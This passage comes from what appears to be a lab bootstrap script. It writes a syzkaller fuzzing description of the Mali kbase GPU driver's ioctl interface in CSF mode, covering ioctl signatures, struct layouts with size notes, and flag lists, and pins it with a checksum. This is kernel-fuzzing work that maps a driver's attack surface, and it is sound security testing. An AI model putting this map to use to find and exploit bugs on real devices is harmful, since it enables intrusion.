KBASE_MEM_QUERY_COMMIT_SIZE = 1
KBASE_MEM_QUERY_FLAGS = 3
KBASE_MEM_QUERY_VA_SIZE = 2
__NR_ioctl = amd64:16, arm64:29
__NR_mmap = amd64:9, arm64:222
__NR_munmap = amd64:11, arm64:215
__NR_openat = amd64:257, arm64:56
__PL_09__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0.txt.const" "d0bc62f316164c4a4d7c681172e8dcc5594c57deef4744a640e443bb09971611"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0_csf.txt")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0_csf.txt" <<'__PL_10__'
# syzkaller syscall descriptions for the Mali "kbase" UAPI — CSF MODE.
#
# RELEASE-MATCHED to: r36p0-01eac0 Bifrost/Valhall DDK built with
# CONFIG_MALI_CSF_SUPPORT=y (MALI_USE_CSF=1) — the companion description to
# dev_mali_r36p0.txt, selected by the bootstrap's MALI_MODE knob
# (MALI_MODE=csf activates this file; MALI_MODE=jm, the default, activates
# dev_mali_r36p0.txt). Only one of the two may be active in sys/linux at a
# time (activate_desc enforces it).
#
# Provenance & verification:
# - Derived from dev_mali_r36p0.txt (itself field-for-field from dev_mali_
#   r41p0.txt) against the same pristine release headers under
#   harness/release_uapi/r36p0 (csf/ subtree drives the CS_* models).
# - Dispatch cross-check against r36p0 mali_kbase_core_linux.c: common cases
#   run in both modes; this file adds the #if MALI_USE_CSF-only cases
#   (MEM_ALLOC_EX + CS_QUEUE_*/CS_GROUP via _1_6 and nr58, CS_EVENT_SIGNAL,
#   KCPU_QUEUE_*, CS_TILER_HEAP_*, CS_GET_GLB_IFACE, CS_CPU_QUEUE_DUMP) and
#   drops the #if !MALI_USE_CSF-only cases (JOB_SUBMIT, POST_TERM,
#   SOFT_EVENT_UPDATE, KINSTR_JM_FD) plus their structs/flag lists.
# - KCPU_QUEUE_ENQUEUE: r36p0's kbase_csf_kcpu_queue_enqueue rejects
#   nr_commands != 1 (mali_kbase_csf_kcpu.c:1961), so nr_commands is const[1]
#   and addr points at ONE struct base_kcpu_command (24B: type + 7 pad +
#   16B info union — modeled opaque; the fuzzed `type` selects the handler).
# - C unions are modeled as the in-view (out-view bytes aliased over the
#   same buffer, ignored unless they carry a gpu_addr resource — see the
#   per-struct comments). Sizes gated by layout_check_r36p0.c (CSF asserts).
# - Excluded (documented): CINSTR_GWT_* (CONFIG_MALI_CINSTR_GWT unset),
#   TLSTREAM_STATS/EXTRA_TYPE/MY_IOCTL/TEST_TYPE (MALI_UNIT_TEST),
#   legacy KBASE_IOCTL_HWCNT_ENABLE/DUMP/CLEAR (absent pre-r36p0),
#   EVENT_MEMORY_WRITE/READ (MALI_UNIT_TEST), JM-only ioctls listed above.
#
# Extraction needs MALI_USE_CSF visible before the first mali header, hence
# the leading <mali_use_csf.h> include: it resolves from
# harness/release_uapi/mode-csf (one #define) — the bootstrap's extract_consts
# passes that dir first in -includedirs for this description. Recipe:
#   bin/syz-extract -arch amd64,arm64 -sourcedir <hardlink mirror of $KT with
#       the uapi/gpu shadow dropped> -includedirs \
#       harness/release_uapi/mode-csf,harness/release_uapi/r36p0 \
#       dev_mali_r36p0_csf.txt
# Keep this file `meta noextract` so `make extract` cannot clobber the
# release-matched consts with values from an unrelated kernel tree.
meta noextract


include <mali_use_csf.h>
include <gpu/arm/midgard/mali_base_kernel.h>
include <gpu/arm/midgard/csf/mali_base_csf_kernel.h>
include <gpu/arm/midgard/mali_kbase_ioctl.h>
include <gpu/arm/midgard/mali_kbase_hwcnt_reader.h>
include <uapi/linux/fcntl.h>
include <linux/types.h>

resource fd_bifrost[fd]
resource gpu_addr[int64]: BASEP_MEM_INVALID_HANDLE, BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE
resource user_addr[int64]: -1
resource fd_fence[fd]
resource fd_hwcnt[fd]

openat$bifrost(fd const[AT_FDCWD], file ptr[in, string["/dev/bifrost"]], flags flags[open_flags], mode const[0]) fd_bifrost
# Our NO_MALI build registers miscdevice mali0 -> /dev/mali0
openat$mali(fd const[AT_FDCWD], file ptr[in, string["/dev/mali0"]], flags flags[open_flags], mode const[0]) fd_bifrost

# GPU VA mmap: kbase's vm_pgoff encodes the region cookie (Phase D smoke:
# mmap(offset=cookie) materializes the SAME_VA region).
mmap$bifrost(addr const[0], len len[addr], prot flags[mmap_prot], flags flags[mmap_flags], fd fd_bifrost, offset fileoff) user_addr
munmap$bifrost(addr user_addr, len intptr)

ioctl$KBASE_IOCTL_VERSION_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_VERSION_CHECK_RESERVED(fd fd_bifrost, cmd const[KBASE_IOCTL_VERSION_CHECK_RESERVED], arg ptr[inout, kbase_ioctl_version_check])
ioctl$KBASE_IOCTL_SET_FLAGS(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_FLAGS], arg ptr[in, kbase_ioctl_set_flags])
ioctl$KBASE_IOCTL_GET_GPUPROPS(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_GPUPROPS], arg ptr[inout, kbase_ioctl_get_gpuprops])
ioctl$KBASE_IOCTL_MEM_ALLOC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALLOC], arg ptr[inout, kbase_ioctl_mem_alloc])
# in-view only: out.value aliases the gpu_addr@0 slot; observing it would
# poison the gpu_addr resource with non-address query values.
ioctl$KBASE_IOCTL_MEM_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_QUERY], arg ptr[in, kbase_ioctl_mem_query])
ioctl$KBASE_IOCTL_MEM_FREE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FREE], arg ptr[in, kbase_ioctl_mem_free])
ioctl$KBASE_IOCTL_HWCNT_READER_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_READER_SETUP], arg ptr[in, kbase_ioctl_hwcnt_reader_setup]) fd_hwcnt
ioctl$KBASE_IOCTL_HWCNT_SET(fd fd_bifrost, cmd const[KBASE_IOCTL_HWCNT_SET], arg ptr[inout, kbase_ioctl_hwcnt_values])
ioctl$KBASE_IOCTL_DISJOINT_QUERY(fd fd_bifrost, cmd const[KBASE_IOCTL_DISJOINT_QUERY], arg ptr[out, kbase_ioctl_disjoint_query])
ioctl$KBASE_IOCTL_GET_DDK_VERSION(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_DDK_VERSION], arg ptr[inout, kbase_ioctl_get_ddk_version])
ioctl$KBASE_IOCTL_MEM_JIT_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT], arg ptr[in, kbase_ioctl_mem_jit_init])
# r36p0-only legacy JIT family on the SAME nr 14 (8B + 16B; distinguished by
# _IOC_SIZE, same pattern Phase F5 modeled for r28p0) — removed in r41p0.
ioctl$KBASE_IOCTL_MEM_JIT_INIT_10_2(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_10_2], arg ptr[in, kbase_ioctl_mem_jit_init_10_2])
ioctl$KBASE_IOCTL_MEM_JIT_INIT_11_5(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_JIT_INIT_11_5], arg ptr[in, kbase_ioctl_mem_jit_init_11_5])
ioctl$KBASE_IOCTL_MEM_EXEC_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_EXEC_INIT], arg ptr[in, kbase_ioctl_mem_exec_init])
ioctl$KBASE_IOCTL_MEM_SYNC(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_SYNC], arg ptr[in, kbase_ioctl_mem_sync])
# in-view only: out.offset aliases gpu_addr@0 (not an address).
ioctl$KBASE_IOCTL_MEM_FIND_CPU_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_CPU_OFFSET], arg ptr[in, kbase_ioctl_mem_find_cpu_offset])
ioctl$KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET], arg ptr[inout, kbase_ioctl_mem_find_gpu_start_and_offset])
ioctl$KBASE_IOCTL_GET_CONTEXT_ID(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CONTEXT_ID], arg ptr[out, kbase_ioctl_get_context_id])
ioctl$KBASE_IOCTL_TLSTREAM_ACQUIRE(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_ACQUIRE], arg ptr[in, kbase_ioctl_tlstream_acquire])
ioctl$KBASE_IOCTL_TLSTREAM_FLUSH(fd fd_bifrost, cmd const[KBASE_IOCTL_TLSTREAM_FLUSH], arg const[0])
ioctl$KBASE_IOCTL_MEM_COMMIT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_COMMIT], arg ptr[in, kbase_ioctl_mem_commit])
ioctl$KBASE_IOCTL_MEM_ALIAS(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALIAS], arg ptr[inout, kbase_ioctl_mem_alias])
ioctl$KBASE_IOCTL_MEM_IMPORT(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_IMPORT], arg ptr[inout, kbase_ioctl_mem_import])
ioctl$KBASE_IOCTL_MEM_FLAGS_CHANGE(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_FLAGS_CHANGE], arg ptr[in, kbase_ioctl_mem_flags_change])
ioctl$KBASE_IOCTL_STREAM_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_STREAM_CREATE], arg ptr[in, kbase_ioctl_stream_create]) fd_fence
ioctl$KBASE_IOCTL_FENCE_VALIDATE(fd fd_bifrost, cmd const[KBASE_IOCTL_FENCE_VALIDATE], arg ptr[in, kbase_ioctl_fence_validate])
ioctl$KBASE_IOCTL_MEM_PROFILE_ADD(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_PROFILE_ADD], arg ptr[in, kbase_ioctl_mem_profile_add])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_MAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_MAP], arg ptr[in, kbase_ioctl_sticky_resource_map])
ioctl$KBASE_IOCTL_STICKY_RESOURCE_UNMAP(fd fd_bifrost, cmd const[KBASE_IOCTL_STICKY_RESOURCE_UNMAP], arg ptr[in, kbase_ioctl_sticky_resource_unmap])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_ENUM_INFO], arg ptr[inout, kbase_ioctl_kinstr_prfcnt_enum_info])
ioctl$KBASE_IOCTL_KINSTR_PRFCNT_SETUP(fd fd_bifrost, cmd const[KBASE_IOCTL_KINSTR_PRFCNT_SETUP], arg ptr[in, kbase_ioctl_kinstr_prfcnt_setup])
# in-view only (32B): out view aliases the request_flags/paddings slots.
ioctl$KBASE_IOCTL_GET_CPU_GPU_TIMEINFO(fd fd_bifrost, cmd const[KBASE_IOCTL_GET_CPU_GPU_TIMEINFO], arg ptr[in, kbase_ioctl_get_cpu_gpu_timeinfo])
ioctl$KBASE_IOCTL_CONTEXT_PRIORITY_CHECK(fd fd_bifrost, cmd const[KBASE_IOCTL_CONTEXT_PRIORITY_CHECK], arg ptr[inout, kbase_ioctl_context_priority_check])
ioctl$KBASE_IOCTL_SET_LIMITED_CORE_COUNT(fd fd_bifrost, cmd const[KBASE_IOCTL_SET_LIMITED_CORE_COUNT], arg ptr[in, kbase_ioctl_set_limited_core_count])

# --- CSF mode surface (MALI_USE_CSF=1 dispatch cases in r36p0
# mali_kbase_core_linux.c; struct sizes vs release headers listed inline).
ioctl$KBASE_IOCTL_MEM_ALLOC_EX(fd fd_bifrost, cmd const[KBASE_IOCTL_MEM_ALLOC_EX], arg ptr[in, kbase_ioctl_mem_alloc_ex])
ioctl$KBASE_IOCTL_CS_QUEUE_REGISTER(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_REGISTER], arg ptr[in, kbase_ioctl_cs_queue_register])
ioctl$KBASE_IOCTL_CS_QUEUE_KICK(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_KICK], arg ptr[in, kbase_ioctl_cs_queue_kick])
ioctl$KBASE_IOCTL_CS_QUEUE_BIND(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_BIND], arg ptr[in, kbase_ioctl_cs_queue_bind])
ioctl$KBASE_IOCTL_CS_QUEUE_REGISTER_EX(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_REGISTER_EX], arg ptr[in, kbase_ioctl_cs_queue_register_ex])
ioctl$KBASE_IOCTL_CS_QUEUE_TERMINATE(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_TERMINATE], arg ptr[in, kbase_ioctl_cs_queue_terminate])
ioctl$KBASE_IOCTL_CS_QUEUE_GROUP_CREATE_1_6(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_GROUP_CREATE_1_6], arg ptr[in, kbase_ioctl_cs_queue_group_create_1_6])
ioctl$KBASE_IOCTL_CS_QUEUE_GROUP_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_GROUP_CREATE], arg ptr[in, kbase_ioctl_cs_queue_group_create])
ioctl$KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE], arg ptr[in, kbase_ioctl_cs_queue_group_term])
ioctl$KBASE_IOCTL_CS_EVENT_SIGNAL(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_EVENT_SIGNAL], arg const[0])
ioctl$KBASE_IOCTL_KCPU_QUEUE_CREATE(fd fd_bifrost, cmd const[KBASE_IOCTL_KCPU_QUEUE_CREATE], arg ptr[out, kbase_ioctl_kcpu_queue_new])
ioctl$KBASE_IOCTL_KCPU_QUEUE_DELETE(fd fd_bifrost, cmd const[KBASE_IOCTL_KCPU_QUEUE_DELETE], arg ptr[in, kbase_ioctl_kcpu_queue_delete])
ioctl$KBASE_IOCTL_KCPU_QUEUE_ENQUEUE(fd fd_bifrost, cmd const[KBASE_IOCTL_KCPU_QUEUE_ENQUEUE], arg ptr[in, kbase_ioctl_kcpu_queue_enqueue])
ioctl$KBASE_IOCTL_CS_TILER_HEAP_INIT(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_TILER_HEAP_INIT], arg ptr[in, kbase_ioctl_cs_tiler_heap_init])
ioctl$KBASE_IOCTL_CS_TILER_HEAP_TERM(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_TILER_HEAP_TERM], arg ptr[in, kbase_ioctl_cs_tiler_heap_term])
ioctl$KBASE_IOCTL_CS_GET_GLB_IFACE(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_GET_GLB_IFACE], arg ptr[in, kbase_ioctl_cs_get_glb_iface])
ioctl$KBASE_IOCTL_CS_CPU_QUEUE_DUMP(fd fd_bifrost, cmd const[KBASE_IOCTL_CS_CPU_QUEUE_DUMP], arg ptr[in, kbase_ioctl_cs_cpu_queue_info])

# hwcnt reader fd (returned by HWCNT_READER_SETUP) — mali_kbase_hwcnt_reader.h.
ioctl$KBASE_HWCNT_READER_GET_HWVER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_HWVER], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_SIZE(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_SIZE], arg ptr[out, int32])
ioctl$KBASE_HWCNT_READER_DUMP(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DUMP], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_CLEAR(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_CLEAR], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER], arg ptr[out, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES], arg ptr[out, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER], arg ptr[in, kbase_hwcnt_reader_metadata_legacy])
ioctl$KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES], arg ptr[in, kbase_hwcnt_reader_metadata])
ioctl$KBASE_HWCNT_READER_SET_INTERVAL(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_SET_INTERVAL], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_ENABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_ENABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_DISABLE_EVENT(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_DISABLE_EVENT], arg ptr[in, int32])
ioctl$KBASE_HWCNT_READER_GET_API_VERSION(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION], arg ptr[in, int32])
# same nr 0xFF, size-encoded newer variant (release drift axis)
ioctl$KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES(fd fd_hwcnt, cmd const[KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES], arg ptr[in, kbase_hwcnt_reader_api_version])

type base_atom_id int8

kbase_ioctl_version_check {
	major	int16
	minor	int16
}

kbase_ioctl_set_flags {
	create_flags	flags[basep_context_create_kernel_flags, int32]
}

kbase_ioctl_get_gpuprops {
	buffer	ptr64[out, array[int8]]
	size	len[buffer, int32]
	flags	const[0, int32]
}

kbase_ioctl_mem_alloc {
# C union (32B): in {va_pages, commit_pages, extension, flags};
# out {flags@0, gpu_va@8}. @8 is modeled as the out view (gpu_va) so
# returned cookies populate gpu_addr (input value lands in commit_pages).
	va_pages	int64
	gpu_va		gpu_addr	(inout)
	extent		int64
	flags		flags[base_mem_alloc_flags, int64]
}

kbase_ioctl_mem_query {
	gpu_addr	gpu_addr
	query		flags[kbase_ioctl_mem_query_flags, int64]
}

kbase_ioctl_mem_free {
	gpu_addr	gpu_addr
}

kbase_ioctl_hwcnt_reader_setup {
	buffer_count	int32
	fe_bm			int32
	shader_bm		int32
	tiler_bm		int32
	mmu_l2_bm		int32
}

kbase_ioctl_hwcnt_values {
	data	ptr64[out, array[int8]]
	size	len[data, int32]
	padding	const[0, int32]
}

kbase_ioctl_disjoint_query {
	counter	int32
}

kbase_ioctl_get_ddk_version {
	version_buffer	ptr64[out, array[int8]]
	size			len[version_buffer, int32]
	padding			const[0, int32]
}

kbase_ioctl_mem_jit_init {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
	phys_pages		int64
}

# r36p0: struct kbase_ioctl_mem_jit_init_10_2 { __u64 va_pages } — 8B.
kbase_ioctl_mem_jit_init_10_2 {
	va_pages	int64
}

# r36p0: struct kbase_ioctl_mem_jit_init_11_5 — 16B (va_pages + 3 u8 + u8[5]).
kbase_ioctl_mem_jit_init_11_5 {
	va_pages		int64
	max_allocations	int8
	trim_level		int8
	group_id		int8
	padding			array[const[0, int8], 5]
}

kbase_ioctl_mem_exec_init {
	va_pages	int64
}

kbase_ioctl_mem_sync {
	handle		gpu_addr
	user_addr	user_addr
	size		int64
	type		flags[base_syncset_op_flags, int8]
	padding		array[const[0, int8], 7]
}

kbase_ioctl_mem_find_cpu_offset {
	gpu_addr	gpu_addr
	cpu_addr	user_addr
	size		int64
}

kbase_ioctl_mem_find_gpu_start_and_offset {
# union (16B): in {gpu_addr, size}; out {start@0, offset@8}. @0 doubles as
# out.start (a live region base) -> inout gpu_addr for chaining.
	gpu_addr	gpu_addr	(inout)
	size		int64		(inout)
}

kbase_ioctl_get_context_id {
	id	int32
}

kbase_ioctl_tlstream_acquire {
	flags	int32
}

kbase_ioctl_mem_commit {
	gpu_addr	gpu_addr
	pages		int64
}

kbase_ioctl_mem_alias {
# union (32B): in {flags, stride, nents, aliasing_info};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	gpu_va		gpu_addr	(inout)
	nents		len[aliasing_info, int64]
	aliasing_info	ptr64[in, array[base_mem_aliasing_info]]
}

base_mem_aliasing_info {
	handle	gpu_addr
	offset	int64
	length	int64
}

kbase_ioctl_mem_import {
# union (24B): in {flags, phandle, type, padding};
# out {flags@0, gpu_va@8, va_pages@16}. @8 doubles as out.gpu_va.
	flags		flags[base_mem_alloc_flags, int64]
	phandle		gpu_addr	(inout)
	type		flags[base_mem_import_type, int32]
	padding		const[0, int32]
}

kbase_ioctl_mem_flags_change {
	gpu_va	gpu_addr
	flags	flags[base_mem_alloc_flags, int64]
	mask	int64
}

kbase_ioctl_stream_create {
	name	array[int8, 32]
}

kbase_ioctl_fence_validate {
	fd	fd_fence
}

kbase_ioctl_mem_profile_add {
	buffer	ptr64[in, array[int8]]
	len		len[buffer, int32]
	padding	const[0, int32]
}

kbase_ioctl_sticky_resource_map {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_sticky_resource_unmap {
	count	len[address, int64]
	address	ptr64[in, array[gpu_addr]]
}

kbase_ioctl_get_cpu_gpu_timeinfo {
	request_flags	flags[base_timerequest_allowed_flags, int32]
	paddings		array[const[0, int8], 28]
}

kbase_ioctl_kinstr_prfcnt_enum_info {
	info_item_size	int32
	info_item_count	int32
	info_list_ptr	ptr64[out, array[int8]]
}

kbase_ioctl_kinstr_prfcnt_setup {
	request_item_count	int32
	request_item_size	int32
	requests_ptr		ptr64[in, array[int8]]
}

kbase_ioctl_context_priority_check {
	priority	int8
}

kbase_ioctl_set_limited_core_count {
	max_core_count	int8
}

# r41p0 has TWO generations of the buffer ioctls on the SAME nr (0x20/0x21),
# distinguished by _IOC_SIZE: legacy (16B, offsetof-cycles) and *_WITH_CYCLES
# (32B full metadata). Model both, release-exact.
kbase_hwcnt_reader_metadata_legacy {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
}

kbase_hwcnt_reader_api_version {
	version	int32
	features int32
}

kbase_hwcnt_reader_metadata_cycles {
	top			int64
	shader_cores	int64
}

kbase_hwcnt_reader_metadata {
	timestamp	int64
	event_id	int32
	buffer_idx	int32
	cycles		kbase_hwcnt_reader_metadata_cycles
}

kbase_ioctl_mem_query_flags = KBASE_MEM_QUERY_COMMIT_SIZE, KBASE_MEM_QUERY_VA_SIZE, KBASE_MEM_QUERY_FLAGS
base_syncset_op_flags = BASE_SYNCSET_OP_MSYNC, BASE_SYNCSET_OP_CSYNC
# 0x400000-0x2000000 are individual bits of BASE_MEM_GROUP_ID_MASK
# (r41p0 has no BASE_MEM_TILER_ALIGN_TOP_EXTENT_MAX_PAGES — ChromeOS-bifrost only)
# CSF ABI renames JM's bit 8/19/20: RESERVED_BIT_8 -> BASE_MEM_FIXED,
# RESERVED_BIT_19 -> BASE_MEM_CSF_EVENT, TILER_ALIGN_TOP -> RESERVED_BIT_20;
# JM-only BASE_MEM_FLAG_MAP_FIXED (bit 27) has no CSF define -> dropped.
base_mem_alloc_flags = BASE_MEM_PROT_CPU_RD, BASE_MEM_PROT_CPU_WR, BASE_MEM_PROT_GPU_RD, BASE_MEM_PROT_GPU_WR, BASE_MEM_PROT_GPU_EX, BASEP_MEM_PERMANENT_KERNEL_MAPPING, BASE_MEM_GPU_VA_SAME_4GB_PAGE, BASEP_MEM_NO_USER_FREE, BASE_MEM_FIXED, BASE_MEM_GROW_ON_GPF, BASE_MEM_COHERENT_SYSTEM, BASE_MEM_COHERENT_LOCAL, BASE_MEM_CACHED_CPU, BASE_MEM_SAME_VA, BASE_MEM_NEED_MMAP, BASE_MEM_COHERENT_SYSTEM_REQUIRED, BASE_MEM_PROTECTED, BASE_MEM_DONT_NEED, BASE_MEM_IMPORT_SHARED, BASE_MEM_CSF_EVENT, BASE_MEM_RESERVED_BIT_20, BASE_MEM_UNCACHED_GPU, 0x400000, 0x800000, 0x1000000, 0x2000000, BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP
base_mem_import_type = BASE_MEM_IMPORT_TYPE_INVALID, BASE_MEM_IMPORT_TYPE_UMM, BASE_MEM_IMPORT_TYPE_USER_BUFFER
# 0x08-0x20 are individual bits of BASEP_CONTEXT_MMU_GROUP_ID_MASK
basep_context_create_kernel_flags = BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED, 0x8, 0x10, 0x20, 0x40
base_timerequest_allowed_flags = BASE_TIMEINFO_MONOTONIC_FLAG, BASE_TIMEINFO_TIMESTAMP_FLAG, BASE_TIMEINFO_CYCLE_COUNTER_FLAG, BASE_TIMEINFO_KERNEL_SOURCE_FLAG, BASE_TIMEINFO_USER_SOURCE_FLAG

# ---- CSF-mode struct models (sizes = sizeof from release headers, 2026-10
# gcc cross-check; layout_check_r36p0.c re-asserts them at gate time).

kbase_ioctl_mem_alloc_ex {
# C union (64B): in {va_pages, commit_pages@8, extension, flags,
# fixed_address, extra[3]}; out {flags@0, gpu_va@8}. @8 modeled as the out
# view (gpu_va) — same chaining pattern as kbase_ioctl_mem_alloc.
	va_pages	int64
	gpu_va		gpu_addr	(inout)
	extension	int64
	flags		flags[base_mem_alloc_flags, int64]
	fixed_address	int64
	extra		array[int64, 3]
}

kbase_ioctl_cs_queue_register {
# 16B. buffer_gpu_addr chains with MEM_ALLOC gpu_va.
	buffer_gpu_addr	gpu_addr
	buffer_size	int32
	priority	int8
	padding		array[const[0, int8], 3]
}

kbase_ioctl_cs_queue_kick {
# 8B.
	buffer_gpu_addr	gpu_addr
}

kbase_ioctl_cs_queue_bind {
# C union (16B): in {buffer_gpu_addr, group_handle, csi_index, padding[6]};
# out {mmap_handle@0} aliases buffer_gpu_addr — ignored (a handle, not an
# address; NOT chained to avoid corrupting gpu_addr).
	buffer_gpu_addr	gpu_addr
	group_handle	int8
	csi_index	int8
	padding		array[const[0, int8], 6]
}

kbase_ioctl_cs_queue_register_ex {
# 40B: queue_register prefix + trace-buffer extension.
	buffer_gpu_addr	gpu_addr
	buffer_size	int32
	priority	int8
	padding		array[const[0, int8], 3]
	ex_offset_var_addr	int64
	ex_buffer_base	int64
	ex_buffer_size	int32
	ex_event_size	int8
	ex_event_state	int8
	ex_padding	array[const[0, int8], 2]
}

kbase_ioctl_cs_queue_terminate {
# 8B.
	buffer_gpu_addr	gpu_addr
}

kbase_ioctl_cs_queue_group_create_1_6 {
# C union (32B): in {...}; out {group_handle, pad[3], group_uid} overlaps the
# first 8 bytes — ignored (u8 handle cannot carry the int64 gpu resource
# layout; queue_bind/group_term consume it as a plain int8).
	tiler_mask	int64
	fragment_mask	int64
	compute_mask	int64
	cs_min		int8
	priority	int8
	tiler_max	int8
	fragment_max	int8
	compute_max	int8
	padding		array[const[0, int8], 3]
}

kbase_ioctl_cs_queue_group_create {
# C union (40B): group_create_1_6 prefix + u64 reserved.
	tiler_mask	int64
	fragment_mask	int64
	compute_mask	int64
	cs_min		int8
	priority	int8
	tiler_max	int8
	fragment_max	int8
	compute_max	int8
	padding		array[const[0, int8], 3]
	reserved	int64
}

kbase_ioctl_cs_queue_group_term {
# 8B.
	group_handle	int8
	padding		array[const[0, int8], 7]
}

kbase_ioctl_kcpu_queue_new {
# 8B, _IOR (id returned by kernel).
	id		int8
	padding		array[const[0, int8], 7]
}

kbase_ioctl_kcpu_queue_delete {
# 8B.
	id		int8
	padding		array[const[0, int8], 7]
}

kbase_ioctl_kcpu_queue_enqueue {
# 16B. nr_commands is const[1]: r36p0 rejects any other count outright.
	addr		ptr64[in, base_kcpu_command]
	nr_commands	const[1, int32]
	id		int8
	padding		array[const[0, int8], 3]
}

base_kcpu_command {
# 24B (uapi csf/mali_base_csf_kernel.h): type + 7B pad + 16B info union
# {fence, cqs_wait/set(_operation), import, jit_alloc/free, group_suspend}.
# The union is opaque bytes; the fuzzed `type` selects the handler, which
# then validates its typed view (fds checked via fdget, addrs via maps).
	type		int8
	padding		array[const[0, int8], 7]
	info		array[const[0, int8], 16]
}

kbase_ioctl_cs_tiler_heap_init {
# C union (16B): in {chunk_size, initial_chunks, max_chunks,
# target_in_flight, group_id, padding}; out {gpu_heap_va, first_chunk_va} —
# no CSF ioctl consumes those VAs, so the in-view is modeled.
	chunk_size	int32
	initial_chunks	int32
	max_chunks	int32
	target_in_flight	int16
	group_id	int8
	padding		int8
}

kbase_ioctl_cs_tiler_heap_term {
# 8B.
	gpu_heap_va	int64
}

kbase_ioctl_cs_get_glb_iface {
# C union (24B): in {max_group_num, max_total_stream_num, groups_ptr,
# streams_ptr}; out {6×u32} aliases — the driver writes through the user
# pointers (copy_to_user), which syzlang models as ptr64[out].
	max_group_num	int32
	max_total_stream_num	int32
	groups_ptr	ptr64[out, array[int8]]
	streams_ptr	ptr64[out, array[int8]]
}

kbase_ioctl_cs_cpu_queue_info {
# 16B: kernel dumps size bytes of CPU-queue state to buffer.
	buffer	ptr64[out, array[int8]]
	size	int64
}
__PL_10__
  sha256_pin "$LAB_ROOT/fuzzing/syzkaller/syzkaller/sys/linux/dev_mali_r36p0_csf.txt" "a449d771f1946122abd3a300df919c0e27ab87b48ae6ae4ca79db9922f656f51"

